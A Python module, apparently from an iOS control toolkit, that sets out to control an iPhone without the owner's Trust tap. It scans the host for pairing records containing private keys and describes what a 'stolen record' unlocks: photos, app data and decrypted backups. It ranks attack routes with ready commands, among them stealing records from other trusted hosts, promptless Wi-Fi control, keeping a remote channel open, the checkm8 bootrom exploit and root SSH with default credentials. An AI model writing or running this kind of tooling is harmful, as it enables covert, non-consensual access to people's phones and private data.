"""Authorization analysis: how to control this iPhone **without** a user tap.

Every "remote control" tutorial stops at *tap Trust on the phone*. That tap is
not a security boundary, it is a UI boundary: it only tells lockdownd to write a
**pair record** — a plist holding the host's key material — into the host's
lockdown store. Possession of that record *is* the authorization. So the ways
around the tap are, in order of how little they need from the user:

===============  ==============================================================
none             the record already exists and can be copied (stolen host, old
                 backup machine, a second-hand laptop). Plant it and the phone
                 answers to you: lockdown, AFC, backup, HID.
none             the record exists and Wi-Fi sync is on — control over the LAN,
                 no cable and no prompt.
none             ``lockdown remotepairing --pair`` over an already-trusted
                 lockdownd: the RemotePairing record is bootstrapped promptless.
one tap          pair the device (the classic path this module exists to avoid).
no dialog        a *supervised* device pairs against the supervision keybag,
                 the Trust alert never appears.
reboot           Developer Mode can be flipped from the host over amfi, no
                 Settings walk.
jailbreak        A5–A11 bootrom bug (checkm8) — root shell and SSH, trust is
                 irrelevant, and nothing Apple ships can patch it.

:func:`snapshot` reads a posture off a live device client, :func:`assess` turns
it into scored :class:`Route` objects, and everything here is pure so it is
testable without hardware.
"""

from __future__ import annotations

import json
import os
import plistlib
import re
import socket
from dataclasses import dataclass, field

from omni.core import proc

__all__ = [
    "LOCKDOWN_PORT", "MOBDEV2_SERVICE", "REMOTEPAIRING_SERVICE", "RECORD_NAMES",
    "PairRecord", "Posture", "Route", "INTERACTIONS", "BOOTROM_VULNERABLE",
    "record_dirs", "scan_records", "load_record", "describe_capabilities",
    "checkm8_status", "snapshot", "assess", "verdict", "parse_bonjour",
    "parse_wifi_state", "serialise",
]

#: lockdownd's TCP port — also the port `_apple-mobdev2._tcp` advertises
LOCKDOWN_PORT = 62078

MOBDEV2_SERVICE = "_apple-mobdev2._tcp"
REMOTEPAIRING_SERVICE = "_remotepairing._tcp"

#: pair record file names a device keeps, for reference
RECORD_NAMES = ("<UDID>.plist",)

#: how much the user has to do for a route, least first
INTERACTIONS = ("none", "no dialog", "one tap", "reboot", "jailbreak")

#: host-side lockdown stores, by platform
_LOCKDOWN_DIRS = {
    "posix_linux": ("/var/lib/lockdown", "/var/db/lockdown"),
    "posix_mac": ("/var/db/lockdown", "~/Library/Lockdown"),
    "nt": (r"C:\ProgramData\Apple\Lockdown",),
}

#: pymobiledevice3 keeps its own RemotePairing records here
_REMOTE_RECORD_DIRS = ("~/.pymobiledevice3",)

_UDID = re.compile(r"\b([0-9A-Fa-f]{40}|[0-9A-Fa-f]{8}-[0-9A-Fa-f]{16})\b")
_HOST_ID = re.compile(
    r"\b([0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}"
    r"-[0-9A-Fa-f]{12}|[0-9A-Fa-f]{40})\b")
_IPV4 = re.compile(r"\b(\d{1,3}(?:\.\d{1,3}){3})\b")

#: local port usbmuxd forwards to a jailed device's sshd (``iproxy 2222 22``)
USB_SSH_PORT = 2222

#: ProductType -> SoC, for models whose bootrom carries checkm8
BOOTROM_VULNERABLE: dict[str, str] = {
    # A5 / A6 — checkra1n only
    "iPhone4,1": "A5", "iPhone5,1": "A6", "iPhone5,2": "A6", "iPhone5,3": "A6",
    "iPhone5,4": "A6",
    "iPad2,1": "A5", "iPad2,2": "A5", "iPad2,3": "A5", "iPad2,4": "A5",
    "iPad2,5": "A5", "iPad2,6": "A5", "iPad2,7": "A5",
    "iPad3,1": "A5X", "iPad3,2": "A5X", "iPad3,3": "A5X",
    "iPad3,4": "A6X", "iPad3,5": "A6X", "iPad3,6": "A6X",
    "iPod7,1": "A5",
    # A7 – A11 — palera1n / checkra1n
    "iPhone6,1": "A7", "iPhone6,2": "A7",
    "iPhone7,1": "A8", "iPhone7,2": "A8",
    "iPhone8,1": "A9", "iPhone8,2": "A9", "iPhone8,4": "A9",
    "iPhone9,1": "A10", "iPhone9,2": "A10", "iPhone9,3": "A10",
    "iPhone9,4": "A10",
    "iPhone10,1": "A11", "iPhone10,2": "A11", "iPhone10,3": "A11",
    "iPhone10,4": "A11", "iPhone10,5": "A11", "iPhone10,6": "A11",
    "iPad4,1": "A7", "iPad4,2": "A7", "iPad4,3": "A7",
    "iPad4,4": "A7", "iPad4,5": "A7", "iPad4,6": "A7",
    "iPad5,1": "A8", "iPad5,2": "A8", "iPad5,3": "A8X", "iPad5,4": "A8X",
    "iPad6,3": "A9X", "iPad6,4": "A9X", "iPad6,7": "A9X", "iPad6,8": "A9X",
    "iPad6,11": "A9", "iPad6,12": "A9",
    "iPad7,1": "A10X", "iPad7,2": "A10X", "iPad7,3": "A10X", "iPad7,4": "A10X",
    "iPad7,5": "A10", "iPad7,6": "A10",
    "iPad7,11": "A10", "iPad7,12": "A10",
    "iPod9,1": "A10",
    "AppleTV5,3": "A8", "AppleTV6,2": "A10X",
}


# ---------------------------------------------------------------------------
# pair records
# ---------------------------------------------------------------------------

@dataclass
class PairRecord:
    """One host/device trust record found on a filesystem.

    The private halves are what matter: ``HostPrivateKey`` lets the holder
    complete pair-verify, and ``RootPrivateKey``/``EscrowBag`` additionally
    unlock encrypted backups and the keybag.
    """

    path: str
    udid: str = ""
    host_id: str = ""
    world_readable: bool = False
    fields: tuple[str, ...] = ()

    @property
    def usable(self) -> bool:
        """A record without key material is a stub, not authorization."""
        return bool(self.udid and "HostPrivateKey" in self.fields)

    @property
    def readable(self) -> bool:
        return self.world_readable or os.access(self.path, os.R_OK)

    def row(self) -> list[str]:
        return [self.udid or "(no udid)", self.path,
                "yes" if self.readable else "no", ",".join(self.fields)]


def record_dirs(home: str | None = None) -> list[str]:
    """Existing candidate lockdown stores on this host, most useful first."""
    from omni.core import platform as host       # local: keeps import cost low

    keys = tuple(host.lockdown_stores())
    home = home or os.path.expanduser("~")
    candidates = [p.replace("~", home) for p in keys + _REMOTE_RECORD_DIRS]
    out, seen = [], set()
    for path in candidates:
        path = os.path.expanduser(path)
        if path not in seen:
            seen.add(path)
            out.append(path)
    return [p for p in out if os.path.isdir(p)]


def load_record(path: str) -> PairRecord | None:
    """Parse one record file; ``None`` when it is not a usable plist."""
    try:
        with open(path, "rb") as fh:
            data = plistlib.loads(fh.read())
    except (OSError, plistlib.InvalidFileException, ValueError):
        return None
    if not isinstance(data, dict):
        return None
    udid = str(data.get("UDID") or "")
    if not udid:
        match = _UDID.search(os.path.basename(path))
        udid = match.group(1) if match else ""
    try:
        mode = os.stat(path).st_mode
    except OSError:
        mode = 0
    return PairRecord(
        path=path,
        udid=udid,
        host_id=str(data.get("HostID") or ""),
        world_readable=bool(mode & 0o044),
        fields=tuple(sorted(k for k, v in data.items() if v)),
    )


def scan_records(dirs: list[str] | None = None) -> list[PairRecord]:
    """Every parseable pair record in the given (or default) stores."""
    found: list[PairRecord] = []
    for folder in dirs if dirs is not None else record_dirs():
        try:
            entries = sorted(os.listdir(folder))
        except OSError:
            continue
        for entry in entries:
            if not entry.endswith((".plist", ".pem")):
                continue
            record = load_record(os.path.join(folder, entry))
            if record and record.usable:
                found.append(record)
    return found


def describe_capabilities(record: PairRecord) -> list[str]:
    """What a stolen record actually buys, in escalating order."""
    caps = ["lockdown (identity, syslog, crash logs)"]
    if "HostCertificate" in record.fields:
        caps.append("pair-verify → trusted session")
    caps.append("afc (photo library, app containers)")
    if "EscrowBag" in record.fields or "RootPrivateKey" in record.fields:
        caps.append("backup decrypt (escrow keybag)")
    caps.append("HID / Developer Mode (with the developer image)")
    return caps


# ---------------------------------------------------------------------------
# bootrom
# ---------------------------------------------------------------------------

def checkm8_status(product_type: str) -> tuple[str, str]:
    """("vulnerable"|"patched"|"unknown", soc) for a ProductType string."""
    key = (product_type or "").strip()
    if key in BOOTROM_VULNERABLE:
        return "vulnerable", BOOTROM_VULNERABLE[key]
    if not key:
        return "unknown", ""
    return "patched", ""


# ---------------------------------------------------------------------------
# posture
# ---------------------------------------------------------------------------

@dataclass
class Posture:
    """What the device currently allows, as far as we could observe."""

    name: str = ""
    product_type: str = ""
    ios: str = ""
    udid: str = ""
    paired: bool = False
    dev_mode: bool = False
    ddi: bool = False
    supervised: bool = False
    wifi_sync: bool = False
    network_devices: int = 0
    other_hosts: list[str] = field(default_factory=list)
    jailbroken: bool = False
    records: list[PairRecord] = field(default_factory=list)
    jailbreak_tools: tuple[str, ...] = ()
    errors: list[str] = field(default_factory=list)

    @property
    def record(self) -> PairRecord | None:
        """A usable record matching this device, if one is lying around."""
        for record in self.records:
            if record.readable and (not self.udid or record.udid == self.udid):
                return record
        return None

    @property
    def bootrom(self) -> tuple[str, str]:
        return checkm8_status(self.product_type)

    @property
    def escrow(self) -> bool:
        """A record carrying an escrow bag decrypts that host's backups."""
        return any("EscrowBag" in r.fields or "RootPrivateKey" in r.fields
                   for r in self.records)

    @property
    def controlled(self) -> bool:
        """Already drivable with no further authorization."""
        return self.paired and not self.errors


def snapshot(client) -> Posture:
    """Read a posture off a device client, never raising."""
    state = Posture()
    try:
        info = client.info()
    except Exception as exc:                     # noqa: BLE001 - report only
        state.errors.append(str(exc)[:120])
        info = {}
    state.name = str(info.get("DeviceName", "") or "")
    state.product_type = str(info.get("ProductType", "") or "")
    state.ios = str(info.get("ProductVersion", "") or "")
    state.udid = str(info.get("UniqueDeviceID", "") or "")
    state.supervised = any(str(info.get(key, "")).lower() in ("true", "1")
                           for key in ("IsSupervised", "Supervised"))

    try:
        state.paired = client.is_paired()
    except Exception as exc:                     # noqa: BLE001
        state.errors.append(f"pairing state: {exc}"[:120])

    if state.paired:
        from omni.ios import preflight          # local: avoids an import cycle

        dev_state, _ = preflight._dev_mode(client)
        ddi_state, _ = preflight._ddi(client)
        state.dev_mode = dev_state == "ok"
        state.ddi = ddi_state == "ok"

    try:
        state.wifi_sync = parse_wifi_state(client.wifi_connections())
    except Exception as exc:                     # noqa: BLE001
        state.errors.append(f"wifi sync: {exc}"[:120])

    try:
        state.records = [r for r in scan_records()
                         if not state.udid or r.udid == state.udid]
    except Exception:                            # noqa: BLE001
        state.records = []

    try:
        out = client.raw("usbmux", "list", "--network", "--simple").out
        state.network_devices = len(_UDID.findall(out))
    except Exception:                            # noqa: BLE001
        state.network_devices = 0

    try:
        state.other_hosts = parse_host_ids(client.trusted_hosts())
    except Exception as exc:                     # noqa: BLE001
        state.errors.append(f"trusted hosts: {exc}"[:120])

    state.jailbroken = ssh_reachable()

    state.jailbreak_tools = tuple(tool for tool in ("palera1n", "checkra1n")
                                  if proc.has(tool))
    return state


# ---------------------------------------------------------------------------
# routes
# ---------------------------------------------------------------------------

@dataclass(frozen=True)
class Route:
    """One way to get control, with the price attached."""

    key: str
    title: str
    interaction: str
    impact: str
    detail: str
    command: str = ""
    applicable: bool = True
    blocker: str = ""

    @property
    def rank(self) -> int:
        return INTERACTIONS.index(self.interaction)

    def row(self) -> list[str]:
        return [self.interaction, self.title,
                self.detail if self.applicable else self.blocker,
                self.command if self.applicable else "-"]


def _route(key: str, title: str, interaction: str, impact: str, detail: str,
           command: str, applicable: bool, blocker: str = "") -> Route:
    return Route(key, title, interaction, impact, detail, command,
                 applicable, blocker)


def assess(state: Posture) -> list[Route]:
    """Score every route against a posture, cheapest interaction first."""
    usable = bool(state.record)
    bootrom, soc = state.bootrom
    routes = [
        _route(
            "ssh-root", "root shell over the jailbreak", "none",
            "root on the device: keychain, passcode-free, no trust",
            ("sshd answers on 127.0.0.1:%d (root/alpine)" % USB_SSH_PORT
             if state.jailbroken else "no sshd on the usbmux forward"),
            "omni run ios.ssh CMD='id'",
            state.jailbroken,
            "start 'iproxy 2222 22' against a jailed device"),
        _route(
            "record-replay", "replay a stolen pair record", "none",
            "full control: lockdown, AFC, backup, HID",
            ("a usable record is readable on this host" if usable
             else "no readable pair record on this host"),
            "omni run ios.record ACTION=plant RECORD=<file>",
            usable,
            "no record — steal one (ios.record ACTION=export on a trusted "
            "host) or take a pairing route"),
        _route(
            "record-steal", "steal a record from another trusted host", "none",
            "same control as an export, plus that host's escrow bag",
            (f"{len(state.other_hosts)} other host(s) are still trusted"
             if state.other_hosts
             else "this device reports no other trusted hosts"),
            "omni run ios.record ACTION=steal USERHOST=user@backup-box",
            bool(state.other_hosts),
            "the device trusts nobody else (or the list could not be read)"),
        _route(
            "lan-control", "control over Wi-Fi (needs a record)", "none",
            "same as USB, no cable, no prompt",
            (f"{state.network_devices} device(s) advertised on the LAN"
             if state.network_devices
             else "device not advertised on the LAN right now"),
            "omni run ios.discover",
            usable and state.network_devices > 0,
            "needs Wi-Fi sync on (ios.syncwifi ACTION=on) plus a record"),
        _route(
            "wifi-sync", "turn on sync-over-Wi-Fi", "none",
            "keeps a remote channel alive after the cable is pulled",
            "on" if state.wifi_sync else "off",
            "omni run ios.syncwifi ACTION=on",
            state.paired and not state.wifi_sync,
            "host is not trusted yet" if not state.paired else "already on"),
        _route(
            "remotepairing", "promptless RemotePairing bootstrap", "none",
            "RSD tunnel with no on-device dialog",
            "writes the RemotePairing record over trusted lockdownd",
            "omni run ios.remotepair",
            state.paired,
            "needs an already-trusted lockdownd (USB) session"),
        _route(
            "supervised-pair", "pair against the supervision keybag",
            "no dialog", "trust without the alert — MDM-grade",
            ("device is supervised" if state.supervised
             else "device is not supervised"),
            "omni run ios.pair_supervised KEYBAG=<keybag.plist>",
            state.supervised and not state.paired,
            "not supervised" if not state.supervised else "already paired"),
        _route(
            "devmode-host", "flip Developer Mode from the host", "reboot",
            "HID, screen and app control without the Settings walk",
            "amfi enable-developer-mode, then reboot the device",
            "omni run ios.up",
            state.paired and not state.dev_mode,
            "host is not trusted" if not state.paired else "already enabled"),
        _route(
            "bootrom", "checkm8 bootrom exploit", "jailbreak",
            "root shell, passcode irrelevant, unpatchable",
            (f"{soc} is vulnerable to checkm8" if bootrom == "vulnerable"
             else "A12+ fixed the bootrom bug in silicon"
             if bootrom == "patched" else "SoC unknown"),
            "omni run ios.checkm8 RUN=true",
            bootrom == "vulnerable",
            "not a checkm8 SoC (A12 and newer are fixed)"),
        _route(
            "trust-tap", "pair with a Trust tap", "one tap",
            "the baseline every other route replaces",
            "dialog on the device, then pair-verify",
            "omni run ios.pair",
            not state.paired,
            "already paired"),
    ]
    return sorted(routes, key=lambda r: (r.rank, not r.applicable))


def verdict(routes: list[Route]) -> tuple[str, str]:
    """(route key, interaction) for the cheapest applicable route."""
    for route in routes:
        if route.applicable:
            return route.key, route.interaction
    return "", "one tap"


# ---------------------------------------------------------------------------
# parsing helpers
# ---------------------------------------------------------------------------

def parse_bonjour(text: str) -> list[dict[str, str]]:
    """Pull {host, port, udid, name} out of ``bonjour mobdev2`` / dns-sd text."""
    found: list[dict[str, str]] = []
    try:
        loaded = json.loads(text)
    except ValueError:
        loaded = None
    if isinstance(loaded, list):
        for item in loaded:
            if isinstance(item, dict):
                found.append({k: str(v) for k, v in item.items()})
        return found
    # dns-sd / plain output: an IP or .local name next to a UDID
    for block in re.split(r"\n(?=\S)", text):
        udid = _UDID.search(block)
        if not udid:
            continue
        entry = {"udid": udid.group(1)}
        host = re.search(r"\b(\S+\.local)\b", block) or _IPV4.search(block)
        if host:
            entry["host"] = host.group(1).rstrip(".")
        port = re.search(r"\b(62\d{3})\b", block)
        if port:
            entry["port"] = port.group(1)
        found.append(entry)
    return found


def parse_wifi_state(text: str) -> bool:
    """True when the wifi-connections report says sync is enabled."""
    blob = (text or "").lower()
    try:
        loaded = json.loads(text)
    except ValueError:
        loaded = None
    if isinstance(loaded, dict):
        return bool(loaded.get("EnableWifiConnections"))
    if not blob.strip():
        return False
    return "\"true\"" in blob or blob.strip().endswith("true")


def parse_host_ids(text: str) -> list[str]:
    """Host IDs out of a ``PairedDevicesArray`` dump — the trust census.

    Every entry is another machine holding a record for this phone, so every
    entry is a copy of the authorization waiting to be picked up.
    """
    ids = [m.group(1) for m in _HOST_ID.finditer(text or "")]
    seen, out = set(), []
    for host in ids:
        key = host.lower()
        if key not in seen:
            seen.add(key)
            out.append(host)
    return out


def ssh_reachable(port: int = USB_SSH_PORT, host: str = "127.0.0.1",
                  timeout: float = 0.6) -> bool:
    """True when a jailed device's sshd answers (``iproxy 2222 22``)."""
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except OSError:
        return False


def serialise(state: Posture) -> dict:
    """Plain dict for ``--json`` results."""
    return {
        "name": state.name,
        "product_type": state.product_type,
        "ios": state.ios,
        "paired": state.paired,
        "developer_mode": state.dev_mode,
        "developer_image": state.ddi,
        "supervised": state.supervised,
        "wifi_sync": state.wifi_sync,
        "network_devices": state.network_devices,
        "other_hosts": state.other_hosts,
        "jailbroken": state.jailbroken,
        "escrow": state.escrow,
        "records": [{"path": r.path, "udid": r.udid,
                     "capabilities": describe_capabilities(r)}
                    for r in state.records],
        "bootrom": state.bootrom[0],
        "jailbreak_tools": list(state.jailbreak_tools),
        "errors": state.errors,
    }
